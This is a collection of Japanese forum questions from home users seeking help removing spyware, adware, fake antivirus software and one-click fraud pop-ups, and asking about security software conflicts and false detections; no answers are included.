Spypodなどスパイウェア検出ソフトを使用し、スパイウェアを探すとき、スパイウェアじゃないのに表示される事があると聞きました。 何故ですか？ 宜しければ教えてください。
ノートPC（WindnwsXP）にある日突然AntiVirusPro2010がインストールされ動作が不安定になってしまいました 邪魔なので、アプリケーションの追加と削除でアンインストールを試みましたが、出来ませんでした マイクロソフトからの提供と思われますが、スパイウェアの削除をしようとするとソフト購入の英語ページに行ってしまいます どのようにすれば、このソフトをアンインストール出来るのでしょうか？
だれか助けてください！ 昨日エロTubuをと言うサイトに進んで行ったら突然 有料アダルトサイトに登録されました。50000円を７２時間 以内に払ってくださいというポップが3分ごと位に表示されます。 もともと払うつもりがありませんが、一刻も早く消し方法を教えてください。sybotやマイクロソフトの削除ソフトを起動させても 異常なしと出てしまいます。 宜しくお願いします！！
Spybotでスパイウェアチェックをしたところ、「CoolWWWSearch.Aff.Winshow」というのが見つかり消したのですが、再度チェックしてみるとまた復活して出てきます。これを消すにはどうしたらよいでしょうか？どういったことをするスパイウェアなのでしょうか？
みなさんこんばんは。 Ad-Awareをインストールしようとすると 「Error このパッケージをインストールするときに予期しないエラーが検出されました。 このパッケージは問題がある可能性があります。 エラー　コードは　2343　です。」 と表示され、インストールできません。 OSはxp セキュリティソフトはウイルスバスター2010 を使っています。 以下の方法で試してみました。 ウイルスバスター2010の不正変更の監視の例外設定をしてインストール 不正変更の監視を無効 本家のサイトから最新版(？)とみられるバージョンをダウンロード いくつかのミラーサイトからダウンロード ファイアウォール設定を無効にしてダウンロードしなおす インストール時カスタムインストールでAd-Watch Live!のチェックをはずし Ad-Watch Live!のインストールをしない 言語をJapaneseではなくEnglishにした それでもやっぱり駄目でした。 このエラーコード2343を検索してみると、英文のサイトはヒットするのですが （フォーラムみたいなサイトでした）日本語での解決方法は見つけられませんでした。 解決方法をご存知の方、よろしくお願い致します。
「SUPERAntiSpyware 」というセキュリティソフトでスキャンすると、ユーザー名が1文字変更（例：タロウ→タロイ）された架空ファイルから、「Trojan.VXGame-Variant/D」というスパイウェアが検知され、一度隔離されます。そして、削除するのですが、再度スキャンするとまったく同じウィルスとファイルが検知されます。 セーフモードでソフトを起動しても、スキャン→隔離→削除→復活！という流れです。 「Trojan.VXGame-Variant/D」というウィルスを調べてみても見つかりませんし、「ウィルスバスター2009」、「Ad-Aware」でスキャンしても検知されないので、たぶん誤検知しているのだと思うのですが、心配です。 架空ファイルを検知することなどありえるのでしょうか？ どなたかご教授お願いします。 検知、隔離されるファイルは2ファイルあります。 １）C:\USERS\（ユーザー名1文字変更）\APPDATA\LOCAL\MICROSOFT\WINDOWS\TEMPORARY INTERNET FILES\VIRTUALIZED\C\USERS\（同上）\APPDATA\LOCAL\MICROSOFT\WINDOWS SIDEBAR\GADGETS\SHOCK4WAY3D.GADGET\MSG.EXE ２）C:\USERS\（同上）\APPDATA\LOCAL\MICROSOFT\WINDOWS SIDEBAR\GADGETS\SHOCK4WAY3D.GADGET\MSG.EXE
パソコンを新規購入して一年。デスクトップなので容量もゆっくり、マカフィー無料版を入れているしVistaなのでセキュリティーは大丈夫と思っていました。でも、最近HP作成のためGoogleのいろんなサービスを展開し、その中のSpyware Doctor入れたら、いきなり凄い数のウイルス数を検出されて、心配だったので、しょっちゅうスキャンするのですがそのたびに検出されます。そして、sono 2日後くらいにマカフィーがトロイの木馬検出、駆除のサインが・・・しかもCPUが尋常でなくいっぱいの状態になっていて、今84%><。。夕べは67%でいろんな物をアンインストールしましたが大して変わらず…逆に大変な状況になりそうなのでSpyware Doctorをアンインストールしたほうがいいと思っているところです。何かご存知の方がいらしたらいしててくださいm(_ _)m
最近マルウェア、アドウェア等のスパイウェアに感染し、セキュリティに関してかなり意識が高まってきました。 そこで、現在「ウィルスバスター2009」、「SUPERAntiSpyware」、「spybot」、「AD-Aware」の4つをインストールし使っています。が、ウィルスバスターをインストール時には、spybotが自動的にアンインストールされますし、ウィルスバスターと「SUPERAntiSpyware」は競合するのでウィルスバスターから不正変更の監視で設定等しなければならないと聞きました。 しかし、現在は4つインストールしたまま設定等まったく行っておりませんし、不都合らしい不都合は特に出ていません。 やはり何か設定等行ったほうがいいでしょうか？ それとも、このままでいいでしょうか？ あと、お勧めのセキュリティソフトや、「これとこれだけで十分だ」というようなソフトがありましたら教えてください。 ご回答よろしくお願いします。
文章の文字以外の記号や数字を自動的に削除してくれるソフトはありますか？ こういう↓文がそこらじゅうにあり、列や行をいじるのには時間かかりすぎるので「」の部分を自動的に削除してくれるソフトを探しています。 今日はこれから 「2. >>　」　 ふるさと
文章を　自動的に　一人称から二人称に作成 フリーソフトはありますか？
お世話になります。 少し前に、アダルトサイトを見ていたら、いつの間にか、登録されてしまったみたいで、それ以降、パソコンを使っていると、「ご登録が完了しました。入金をお済ませください。」といった広告が数分おきに出てきます。 料金を払うことはしませんが、この広告を消すにはどうしたらいいのでしょうか？ご存知の方がいましたら、教えてください。よろしくお願いします。
文章を自動的に一人称から二人称に作成 フリーソフトはありますか？
先日ウイルスバスターを2009から2010にアップデートした所、画面右下に出ていた「キー入力暗号化」のアイコンが消えてしまいました。 TRENDMICROのヘルプを見ても、どうすればアイコンが出せるのか、私には判りませんでした。 申し訳ないですが、ヘルプよりも判りやすい説明（手順）を教えて頂けないでしょうか。
マイクロソフトからの案内があった際にダウンロードした対策ファイルはインストールしようとしたら、ヴァージョンが違います、という反応で不能でした。一方、ノートンでは感染がありませんと言っています。 対応策は、ほうっておくか、ウィンドウズのヴァージョンをXPよりも 新しいものに換えるということでしょうが、後者の場合、マイクロSの 思う壺なのではないかとちょっとためらっています。アドバイスをいただけますか。
当方、デルDimension3100C、XP、AVGフリー版を入れてます。 AVGのSecurity Center Alertで、「Win32.Conflicker.C」というソフトを入れてもいいのか？と何度も何度も聞いてきます。リスク程度は「High」なので、困ります。 そのSCAのボタンには、「×」と「Enable Protection」しかないので、「×」を押すと、その場は、やり過ごせますが、しばらくするとまた聞いてきます。「Enable Protection」を押すと、今度は、「Proof Defender 2009」なるソフトを入れようとします。 1.「Win32.Conflicker.C」は、ウイルスなどの悪いですか？ 2.「Enable Protection」とは、何をするボタンですか？ 3.「Proof Defender 2009」は、悪いソフトですか？ 4. セキュリティの警告が出ないようにするには、どうすればいいですか？
PCはDELLinspiron530 CPUはCore2DuoE6550(2.33GHz) メモリは1GB×4の4GB（1GB×2を増設） OSはVistaHomePremiumSP1 グラボはGeForce8600GT ハードディスクはST3500630AS ATA Device micro ATX仕様 電源は300Wです。 MirarとFindbasicが消えません。 Mirarについては、検索すると多く出てくるのですが、ほとんどがIEのツールバーが消えないという物ばかりです。 わたしは、Firefox,IEともMirarのツールバーはスパイボットで消すことが出来ました。 しかし、コントロールパネルの「プログラムと機能」を見ると、Mirarのプログラムが存在します。それをアンインストールしようとダブルクリックをするのですが、「MirarUninstaller」という英語の画面が出てきます。 英語で分からないので、この先は進んでいません。 Mirarをプログラムから削除する方法はありませんか？ それとも、ツールバーが消えたので、このまま放っていても大丈夫でしょうか？ あと、Firefoxのアドオンに「Findbasic」というのがあるのですが、ほかのアドオン同様、「設定」、「有効化、無効化」、「削除」とありますが、「設定」と「削除」が灰色になっており削除できません。 検索しても数件しか見つからず、何の情報もないです。 どなたか削除方法をご教授ください。
誤って変なプログラムをインストールしてしまい、それ以来ＩＥの調子が不調です。 具体例 立ち上げ時のＨＰが時折おかしな中国サイト（133なんちゃら）に強制的に変更されてしまう yahoo!コミックなどのコンテンツが正しく表示されない ニコニコ動画で動画を開くとエラーが起こり、動画が表示されない。更新を押すと治る ウィルススキャン、Ｓ＆Ｄや悪意のあるプログラム除去ツールなどは試しましたが一切引っかかりません どうしたらいいでしょう？
パスワード等の入力画面になると 「要求したページは暗号化されていますが、暗号化されていない項目を含んでいます。あなたがこのページで表示や入力する情報は第三者が簡単に傍受できます。」 と表示されます。これはどういうことでしょうか？ 表示されたら入力はしないほうがいいのでしょうか？ バージョンは3.5.3です。
仕事仲間から＜ＰＰＴファイル＞を受け取ったのですが、私のＰＣにはＰＰＴソフトがインストールされておりません。私は、いまのところＰＰＴソフトを使ってプレゼンテーションなどを作成するつもりはありません。ただ受け取ったファイルを開き、保存し、プリントアウトしたいだけですが、そのためにはどのようにしたら良いのか教えてください。 又、＜ＰＰＴファイル＞を購入しなければならない場合、上記の目的のためだけにＰＰＴソフトをインストールする場合、どのソフトをインストールするべきかも教えてください。 ＰＰＴソフトは種類も多く、かなり高額なので、私の目的に最適なものを安価にインストールしたいと思っていますので、宜しくお願いします。
この間、ドラマを観ようとMEGA動画?を開いたら 間違えてGamingHarborというものをダウンロードしてしまいました。 コントロールパネルを開いてすぐに消そうと思ったんですが、 消そうとするとそのサイト?みたいなのが出てきて 「Setup detected one or more Internet Explorer is running. Please all Internet Explorer and then click Retry to continue. Or click cancel to quit Setup.」 再試行（R)　／　キャンセル と出てきて、いくらやっても消えてくれません・・・。 このままだと、ネットを使っているとアダルトサイトの広告が出てきてしまうので、小学生の妹にパソコンを使わせることが出来ません… どうしたら消す事ができますかっ？？？ あまりパソコンに詳しくないので、分かりやすく教えて欲しいですっ。 宜しくお願いします…。
どうしたらよいかわかりません。 どなたか助けてください。 ウイルスバスターで６個もウイルス、スパイウエアーを検出できたのですが駆除できません。 ウイルス駆除のボタンを押しても指のマークが出てこないのです。
初心者です。OutlookExpress等からEメールを送信した場合に，経由したプロバイダサーバーやIPアドレスのほか，自分のパソコン名まで記録されている事をメールヘッダーを表示して知りました。（YahooとMNSでは記載が多少違うようですが） Eメールではなく，サイトによくある投稿や質問ページに書き込みをして送信した場合に，自分のパソコン情報がどの程度相手に（受信者）に伝わるものなのか，知りたくなりました。 どなたかご教示ください。（サンプルを見れたらなお参考になります）
近頃、毎日Nortonでスキャンするたびに「Tracking Cookie」が検出されます。 一応、毎回削除はしているのですが、さすがに辟易しています。 悪意のあるウィルスでは無く、安全なものだと聞きましたが Nortonで検出されると、やはり気分の良いものではありません。 Tracking Cookieを“検出対象外（除外）”ではなく“進入防止”にしたいのですが、可能でしょうか？ 方法がありました。手順を詳しく教えてください。 又、操作後の不具合や誤作動が起こる場合がありましたら、そちらも合わせて教えてください。 是非、宜しくお願い致します。 OS/Windows XP ウィルスソフト/Norton AntiVirus 2008
WinXP(HE SP2)+NIS2009を使っています。時々、エクスプローラーを開けて、「Temporary Internet Files」や「Temp」フォルダを開いて総て削除をしています。数日前から、「Temporary Internet Files」の中のひとつのファイルが削除できません。ファイル名は以下のとおりです。 kaw.stj.s-msn.com・♂・♂・～～～（この文字が32個続く）～～～♂・URL」 最後の」は、半分下にずれています。それと、今見たら「Temporary Internet Files」の中身がありません。ダウンロードをしないようになったのかもわかりません（インターネットは問題なく見れます）。危険なもののような気もします（ファイルを♂以外コピーしてインターネットを開くとNISのメッセージがでる）。これはどうしたらいいのでしょうか。
はじめまして。 持っているWINDOWS XPにノートンアンチウイルス2005を入れているのですが、毎年更新しております。 5000円弱でそこまで高くはないのですが、このソフトを今後、更新しなくて入れていなければ、やはりウイルスにかかって大きな問題が起こったり、セキュリティー関係に問題が出てきたりしますか？ 今でも、少しハードウェアに問題があるのか、フリーズしたりしますが、このノートンの効果ってどのようなものか、いまいちわかっていないので(^^； お詳しい方、このソフトをいまでも入れておいたほうがよいのか？別に必要でないのか、良ければ教えてください。
　ウィルスバスター2009を使用しているものですが、私のブログがGoogleの検索でURL評価において『このページは未テストです。サポートされていないプロトコル (HTTPまたはHTTPS以外のプロトコル) が使用されている可能性があります。 』と評価されます。これはどのようなことが原因でしょうか。宜しくお願いいたします。
iMeshをダウンロードしたのですが、出身地といったプロフィールを軽く登録したのですが、危険なフリーウェアと思いすぐにアンインストールしました。なので、何もダウンロードしていないし、他の質問にもあったようにスパイウェアといったものは、出てきてません。 アンインストール後にログインしてもログインできなかったので、退会扱いになっているのかどうかよくわかりません。退会扱いになっていればうれしいのですが... iMeshについての説明が詳しくないので、よろしくお願いします。
初めて質問させていただきます。 昨日からPCでの作業中に突然作業しているものからフォーカスが外れてしまうことが発生ようになり、タスクマネージャにて何が動いているのか確認をしてみたらIEが立ち上がっていました。 画面は出ずに起動しているようなのでプロセス終了をしてみたところ、数が増えました。Process Explorerからだと終了することができるみたいなので立ち上がり次第それで終了させています。 思い当たるものというと先日海外サイトにアクセスした後からavast!がWin32:Trojan-gen {Other}を検出しました。消すことも移動も名前の書き換えもできないファイルだったので対処はそのままにしておきました。 そして昨日に上の状態が発生し、他の質問で薦められていたAd-AwareでスキャンをかけたところWin32.TrojanDownloader.Boltologが検出され、場所はC:\Program Files\Alwil Software\Avast4\DATA\moved\install.exe.virでした。対策は削除を選択しましたが、未だにIEが勝手に立ち上がります・・・ もう一度Ad-Awareでスキャンをかけましたが今度は何も検出されませんでした。 リカバリはできないのでどうにか駆除する方法を教えていただけませんか？ 動揺していて文章がおかしい所も多々ありますがどうかよろしくお願いします
最近インターネットで新しいページに切り替えるときなどに勝手に別ウィンドウで日本語や英語で書かれた広告ページが勝手に出てきます。 その対策を調べてＡｄＡｗａｒｅ（フリー）で３つほど完全スキャンを通常・セーフモードともにやったのです改善されず、ウイルスバスター２００９のお試し版でもくまなくウイルスを探せるシステムをつかって８つスキャン（？）したのですが改善されません。 バスターを使う前に、システムの復元も推奨されているポイントよりも先に設定してやったのですが、これでも駄目です。 また、関係あるのかわからないのですが、ページは開いたままなのですが「ＩｎｔｅｒｎｅｔＥｘｐｌｏｒｅｒは動作を停止しました」というお知らせもたびたび出てきます。 文字入力の反応も遅く、少し速くタイプを打つと、ところどころアルファベットが抜けてしまいまともに文字が出てきません。。。 ”どなたか上記の問題の一つでもいいですから対策の手順を教えていただけないでしょうか？” 再セットアップやリカバリは控えたいです。 ノート型のＰＣ－ＬＬ７７０ＨＧ１Ｋ（Ｌａｖｉｅ）を使っています。
あるスクリーンセーバーのダウンロードのHPより、exeファイル実行でスクリーンセーバーをダウンロードしたところ、毎日以下のHPが自動的にいくつも立ち上がり、困っています。 http://www.perfspot.com http://www.screenscorner.com http://jp.888.com/ http://www.angel-live.com/ セキュリティソフトはNorton360を使用しており、スパイウェアやウィルスを検索するスキャンをかけても直りません。 アンインストールをしようと、コントロールパネルのプログラムのアンインストールで見ても、それらしいソフトはありません。 どのように解決したら良いかご存じの方がおられましたらお願いします。
Ad-Aware Free AEを窓の杜からダウンロードし使用していますが、アップデートだけ使用できません。4回程アンインストールし再度ダウンロード直しましたが、アップロードボタンにマウスを乗せると少し色が変わりますがクリックしても全く反応が有りません。何らかのコメントも出ません。スキャン等他の機能は使用できます。ファイヤーウオール等外しても全くぴくりともしません。ダウンロード先もドライブCで特別な場所にはしていません。ご存知の方ぜひお教え下さい。 OS　WINDOWS　XP　SP3 セキュリティ　　ウイルスキラーとSPYBOT
こんにちは、母親の使っているPCで、ウィルスに感染したようで お聞きしたいです。 ＊6年前に購入したノートPC(バイオ）、6年間ダイヤルUPで２月に1回ほど接続してた。 　　最近（2ヶ月前にブロードバンド開通をした １．ウィルス感染の有無、種類 　　今まで1ヶ月に1度しかネットを使わず、ダイアルアップで使っていた（６年間）。 　ブロードバンド開通が2ヶ月前、OCNのサポートに開通してもらった（出張サービス） 　　先週、その所為か不明であるがOUTLOOKエクスプレスから、OUTLOOKに変えたら、 　EXCELソフトの消滅、ウィルスソフトの消滅（ウィルスセキュリティー）、PCの処理速度の 　低下（３秒で開いたフォルダ、３０秒くらいかかる）などの症状がでました。WINDWSのバージョン 　を確認するとSP１しか入っていませんでした（サポートは気づいていたのか？）。 　　対応としては、１．WINDOWS　UPDATA　２．無料ウィルスソフト　kingSoftを入れてスキャン 　しました。スキャン結果　ハイリスク3件、リスクありが6件くらい（ソフト）で評価60点/100点中でした。 　その見つかったウィルスは駆除できないとのことでした。 　Q1 　　　この現象はスパイウェアーでしょうか？ウィルス感染でしょうか？何故おきたのでしょうか？ 　　　リカバリーをかけないともう、救出できないでしょうか？ 　Q2 　　このままにしていたら（すでに２，３日使っている）、どうなるのでしょうか？ 　Q3 　　対策として、リカバリーディスクを使用して再インストールしないといけない場合、WINDOWSの 　　UPデートはどのようにした方がよいでしょうか？OS再インストール後ネットにつないでも短い 　　時間なら問題ない！？ 　Q4 　　中の画像とWORDデータのファイルを移動してもよいか？ 　Q5 　　　おすすめのウィルスソフトはあるでしょうか？ 宜しくお願いいたします。
以前、別カテで御相談しました。 私のパソコンのユーザーフォルダに、「.rnd」というRNDファイルがあります。大きさは、1.00KBです。更新日時はパソコンを立ち上げるたびに変わります。作成日時も変わることがあります。 今は、作成日時は、今年の７月の某日になっております。 正直、不気味です。ウイルススキャンをしても問題はありませんでした。インターネットでは同じような悩みを抱えてる方がいるみたいで、その方はファイルを消したそうです。 しかし、私はこのファイルが怪しいものではなく、何かのソフトで作成された通常データで削除するべきでないものではないかと危惧し、削除に踏み切れておりません。 現時点で、「.rnd」が生じる可能性のあるソフトをいくつか耳にしましたが、それらはインストールしていません。 というわけでですね、ウイルススキャン（もちろん定義は最新）では引っかからないけど、パソコン内に正体不明のファイルがあるときの正しい処置方法を教えてください。 私は様子を見るのもありかなとは思います。 パソコンには幸い、大切な情報はありませんから。
フリーソフトのインストールをしたところ、一緒にAsk Tool bar というものが登録されていました。 こちらのアンインストールをしようとしたところ、アンインストールができなく設定されており困っています。 自分で削除方法を調べて実行したのですが、うまく削除できません。 ちなみに削除方法は、Hijack Thisというソフトをトレンドマイクロからダウンロードし、起動します。 「Do a system scan and save a logfile　（スキャンを行って、ログファイルを保存）」をクリックしまして、Ask Tool barの項目を 確認。 一度、Hijack Thisを閉じてから、再度起動します。 今度は上から二番目、「Do a system scan only（システムスキャンのみを行う）」をクリックしまして、Fixしたいものにチェックをいれました。 Ask Tool barの項目は２つ見つかりましたので、その２点にチェックを入れています。 その後、「Fix checked」をクリックしこれで無事完了かと思っていたのですが、ここでエラーになるようで、アンインストールできないままでいます。 エラー内容は英語でunable to create folder to place backups in . Backups of fixed items cannot be saved! の表示の後 Hijack this is about to remove a BHO and the Corresponding file flom your system. close all Internet Explorer windows AND all Windows Explorer windows before continuing for the best chance of success. と表示されます。 削除の参考にさせていただいたサイトはこちらです。 http://www.higaitaisaku.com/hijackthis.html#jyokyo 申し訳ございませんが、対応方法を教えてください。 ちなみに私はVistaを使用しています。 よろしくお願いします。
会社のパソコンがワンクリック詐欺にあい、ero tubeというサイトに会員登録されてしまいました。 そして告知画面が消しても消してもデスクトップに出てきてしまいます。 そこで質問なのですが、この場合、メールなどのログイン類はもちろん、パソコンにあるワードやエクセルなどのソフト類も使用しない方がよいのでしょうか？ また共有で使用しているパソコンも使用しない方がよいのでしょうか？ よろしくお願いします。
先日Win（VISTA）PC（VAIO）を購入したのですが、SpySweeperとMcAfeeがインストールされており現在無料期間で共に稼働中です。 さて、この二つは機能的に競合していないのですか？ McAfeeにもスパイウェア対策が含まれていると考えているのですが・・・。 どちらか無料期間がきれたらアンインストールするつもりなのですが、両方とも残しておくべきですか？ また、機能的に競合しているので片方だけ残せば良いとした場合、どちらがお勧めでしょうか？
昨日、カウンターストライクオンラインというゲームを、友人に勧められてインストールしてみました。 昨日はプレイできましたが、すぐ飽きて30分くらいでやめました。今日になって開こうと思ったら、「ハッキング検知」というウインドウが出てきて、「StartService 定義されていない」（だったかな？）と表示されました。 ハッキング検知とは、自分のパソコンがハッキングされているということを検知したという意味なのですか？ 何かが定義されていないようですが、どういうことでしょう… 初心者の質問で申し訳ありません。もしお時間ありましたらよろしくお願いします。
アンチウイルスソフトでスキャンしたところマルウェアが検出され、とりあえずチェストに隔離しました。そのソフトのフォルダには他にもファイルがあるため、アンインストールしてすっきりきれいにしたいのですが、「アンインストール」をクリックしても、コントロールパネルの「プログラムのアンインストール」も反応しません。当のexeファイルが隔離されているためかと思うのですが、こういう場合どうやってアンインストールすればよいのでしょうか。 よろしくお願いします。
最近ネットでサイトを開いているとよく変なゲームのページやアダルトのページ、意味のわからない広告が別ウィンドウでたくさん出てきます 一度消しても、また違うページを開くとすぐに出てきました。 なのでAd-Awareをダウンロードしたんですが何度スキャンしても Cookiesからたくさん検出されます。毎回数も違います。 それでも広告とかが勝手に開かれます 最近ではインターネットもすぐに勝手に閉じられます 作業もできずに困っています。 初心者というよりまだ中学生なので分かりやすく教えてくださるとありがたいです。親はPC全然できないので頼れません。 お願いします
ウィルスバスターのリアルタイム検索で、TROJ_SMARDF.Cというウィルス／スパイウェアを検知しました。 感染ファイルはC:\WINDOWS\system32\clbcat.dllと表示されたのですが、 このようなファイルは存在しません。（似たものはありますが） そこで、ネットで調べてみましたら、clbcat.dllが見つかった場合は、 virtumondoというマルウェアが入り込んでいる可能性があるという記事を 見つけました。その記事を掲載しているサイトから フリースキャンをダウンロードして検索・削除をトライしたのですが、何も検知されませんでした。 http://www.exterminate-it.com/malpedia/file/clbc … 実はかなり前から以下のような症状があります。 ・ネットワーク内のフォルダにアクセスするとIEが立ち上がってみたこともないようなページを勝手に開く （毎日違うアドレスです） ・IEのホーム設定が何度直してもGoogleになってしまう ・勝手にオンラインスキャンが実行されてるようなページに飛ぶ 過去にSPY-BOTで別のマルウェアを削除したのですが、それ以降も上記の 症状は治らないので別の原因があると思い日々試行錯誤しています。 今回又異なるマルウェアらしきものが入り込んでいるとしたら、 このＰＣをターゲットにして攻撃しているのでしょうか。 あやしげなサイトは踏んだ記憶もありませんので・・・。 長くなり申し訳ありませんが、解決方法のアドバイスをお願いします。 ＰＣはWINXP、IE7です。
子供がインターネットで不用意にアダルトサイトにアクセスしたらしく、 「登録が完了しました。お客様は正規の手順を経て当アダルトサイトに登録され、動画コンテンツの閲覧の権利を有しています」旨の メッセージウィンドウが表示されます。 このウィンドウは、閉じても閉じても 5分間隔で出現するため大変困っています。入金を催促するメッセージも書かれているのですが、こちらについては無視するつもりでいます。 一定間隔で開くようなプログラムが自分のパソコンにダウンロードされていると推測し、それらしいファイルをパソコンから削除しているのですが、状況がかわらないため 相談させていただきました。 どなたか、この現象の解決方法を教えていただければ幸いです。
spybot search ＆ destroyをスパイウェア対策にインストールしたのですが、スキャンすると、PartnerBHQというものが検知されるのですが、削除しようとすると「This action may not be performed completly since you are not an administrator.If you want this performed for all users,please run this application elevated as　administrator.」という英文が表示されて、「OK」をクリックすると「いくつかの問題箇所が修正/削除できません；理由はファイルがメモリ上にある為です。この問題は再起動後に修正/削除できます。次回のシステムスタートアップでSpybot-S&&Dを起動しますか？」と表示され、「はい」を選択しても削除されません。検出されたPartnerBHQはAd-awareやノートンでは検出されずにこのSpybotのみで検出されたものです。ですから誤検知なのかとも思うのですが、一度スパイウェアと検出されたものを放置しておくのは不安です。どなたかご指導お願いします。あと、最初に表示される謎の英文は何なのでしょうか。
あまりＰＣに強くない者です。教えてください。 SONY VAIO PCV-RZ53　を使用しています。 重くなってきたのでリカバリをしようと思っています。 ウィルス対策ソフトはNorton Internet Security のダウンロード版2006年を延長使用しています。 リカバリ後Windows Updateをする前にセキュリティソフトを入れるように本などには書いてありますが、ダウンロードして今使っているセキュリティソフトを外付けのHDDか、CDかDVDに焼いて保存しておくことはできるものなのでしょうか？ それができないのであれば、もう一度購入するしかないのでしょうか？ 安易にダウンロード版を購入してしまったので、CD-ROM版であれば解決したのですが…。 もしどこかに保存か焼ける方法があるのでしたら、教えてください。
一つでもパソコン内にスパイウェアが存在していたらそのパソコンで買い物をする行為はとても危険なことなのでしょうか？どんな危険が待っているのでしょうか？ ど素人なので専門用語が分からないのでよろしくお願いします。
Internet Explorerのアドオン管理をチェックしていたところ， AL2Spy Class，Fineartというものがいつの間にか組み込まれていました。 これはスパイウエアなのでしょうか？もし有害なものであれば除去する方法はあるでしょうか？ 教えていただけたら助かります。 ちなみに，ウイルス対策はNorton Internet Securityを使っています。
現在使用しているパソコンはノートン、Windows defender、Ad-awareの三つでウイルス、スパイウェア対策をしています。これで十分でしょうか。 また、ノートンの無料期間が終了すると、フレッツ光プレミアムのセキュリティ対策ツールとAd-awareの二つのみでウイルス、スパイウェア対策をしていく予定なんですが、これで十分でしょうか。
ノートンだけだとウイルス対策は大丈夫だけどスパイウェア対策は他にも何かスパイウェア対策ソフトを併用する方がいい、と聞くのですが本当ですか？また、スパイウェア対策に優れたソフトウェアを教えてほしいです。spybotを一度調べてみたのですが拡張子がexeだったので不安でダウンロードできませんでした。
今日パソコンをつけて、ファイアウォールやマルウェア対策のセキュリティが有効になっているかどうかチェックしてみると、全て無効になっていて、しかしまた慌てたように一瞬の間に自動的に全て有効になりました。これは一体何なのでしょうか。セキュリティが無効の状態なのに有効の状態に見せかけて無防備な状態でネットにつなげさせるようなマルウェアの影響か、もしくは他の脅威なのかもと心配なのですが。。
パソコンにマルウェア対策としてノートンとWindows defenderがあり、両方有効にしているのですが、今日つけてみるとWindows defenderの方が勝手に無効になっていました。一体なぜですか？
ウイルス、スパイウェア対策ソフトが競合するとどういった障害起こるのですか？過去の回答を拝見したのですがはっきりと確定されたものがなくて、的を絞って質問させて頂きました。競合することでスパイウェアやウイルスの侵入を許してしまうことはあるのでしょうか。
megauploadで大量のファイルをDLして解凍までしまった後、ウイルスやスパイウェアなどが不安になった場合、おとしたファイル(MP3です)を削除したほうがいいですか？ 住所などを盗まれるのは頻繁に起こるのですか？ かなり怖いです…。 ちなみに、ウイルスバスターは入っています。
スパイウエアには色んな種類があると思いますが、仕組まれるとどんな作業も他人に筒抜けにできてしまうのでしょうか？ 例えばどんなＨＰを見たか、どんなウエブメールを見たかと言うような 事もわかるのですか？
突然ですが、ウイルスバスターで 『信頼済みでないコンピュータ/機器が、ネットワークに接続されています。』 と表示されます。 何度もヘルプに従って『例外ルールを追加する』や『信頼を取り消す』をクリックしているのですが、しばらくすると再び同じ画面が起動して、不正侵入を防げていないようなのです。 ヘルプに載っている例外ルールの設定が～、なども試してみたのですが、いまいちよく分からない上に、成功もしておりません。 教えて！内の同じような例も読んでみたのですが、よく分かりませんでした。 不正侵入を防ぐ対処方法をお教え願います。 また、今後侵入されないようにする方法もできればお教え下さい。 参考に表示されている情報を書いておきます。 ステータス→未設定 ＩＰアドレス→192.168.1.1 コンピュータ名→不明 ＭＡＣアドレス→00:08:87:90:D7:B9 ネットワーク機器→ルータ 二つ目が、 ステータス→未設定 ＩＰアドレス→192.160.1.4 コンピュータ名→不明 ＭＡＣアドレス→00:1B:7A:C8:C6:7D ネットワーク機器→不明
スパイウェアというものが最近恐ろしく感じるのですが、スパイウェアはどういった人達が仕掛けているのですか？普通の一般の人も誰かのPCにしかけたりしているのですか？
教えて！GOOの皆様。いつも御回答ありがとう御座います。 さて私が使用している『ウイルスバスター2009』について質問いたします。 状況と致しましては常時左下のアイコン部分に、【！】が表示されており、【ウイルスバスター２００９ではアップデートが必要です。】とカーソルをアイコンに向けると表示されます。 しかし、たまにアイコンに変化があり「ウイルスバスターをアップデートしています。」という表示は出ますが、その後アイコン部分に【！】が出現する次第です。 いままで、私と致しましては、ソフトの何らかの破損、不不具合があるのかと思い、ウイルスバスターを推奨方法にてアンインストールし、再度、インストールいたしましたがうまくいきません。 どうしたらば状況が改善するのか非常に困っています。 ちなみに私が今使用しているPCの機能ですが、以下のとおりです。 ＯＳ WindowsＸＰ Home Edition service pack(SP2) サポート Mobile Intel celeron(TM) CPU １１３３ＭＨＺ １、１３ＧＨＺ ２４８ＲＡＭ となっております。 恐縮では御座いますがどうか有意義なご回答の程宜しくお願い 申し上げます。 以上、皆様のご回答宜しくお願い申し上げます。
パソコン初心者です。わかりやすく教えていただきたいのですが、ウイルスバスターというウイルス対策ソフトのホームネットワーク管理画面をクリックして開くと検出されたコンピュータの合計数が表示されますが、これは何を意味するのでしょうか。そのことは、私の使っているパソコンがそれらのコンピュータと接続されていて、私のパソコンの中の情報がそれらに漏れていることを示しているのでしょうか。もしそうなら、そのような接続を常に遮断するための方法を教えてください。
ウイルスバスターを使っていますが、制限がかかり、お酒やたばこ関係のホームページが見れません。
はじめて書き込ませていただきます。 ５年ほど前の話ですが、Windowsのノートパソコン（NEC?）のフロントにカメラがついていました。 いつも通りパソコンを使用し、ウインドウを閉じて行くと最奥のウインドウに男性の顔の動画（おそらくウェブカメラか同じ様な付属のカメラでリアルタイムに録画再生されているもの）がパッと出て驚いて、慌ててウインドウを閉じたことがあります。 セキュリティなどが甘かったのか、自分で起動させてしまったのか今でも解りませんが…… ふだん使用するパソコンはMacintoshでしたので、カメラもついていないのでそういう事は一度きりでしたが、今のMacにはiSightカメラがついていますよね？ その上bootcampでwindowsXPを入れているため（セキュリティソフトも使用していますが）、iSightカメラが動作しているかどうか（自分でデータ送信していないか）だけでも判断する方法はありますか？ あまりセキュリティなどに詳しくないため、読むべき記事などがあればURLを参照していただけると助かります。 ハードはIMAC 24"/3.06/SD、Macbookproです。共にbootcamp内にwindowsXP（とウイルスセキュリティゼロ）をインストールしています。
パソコンがスパイウェアに感染した場合、リカバリーすれば、スパイウェアの心配を全くしなくていいのでしょうか。
色々なサイトが出るようになったので、Spybot S&Dで見たら何個か出てきました。 でも無料版だと駆除は出来ないのでしょうか？駆除しようとすると購入のサイトに行きます。
お分かりの方がおられましたら、お教えください。 数ヶ月前から、タスクマネージャーのパフォーマンスを 調べたら、数秒ごとにCPUの使用率が９４％くらいに上 がり、絶えず、山と谷の連続曲線を示します。 PCショップに相談したら、スパイウェアだといわれ、 それらを駆除したのですが…。 相変わらず、パフォーマンスに変化が現れ、困っていま す。 スパイウェア以外に原因が考えられますか? お教えくだされば、幸いです。
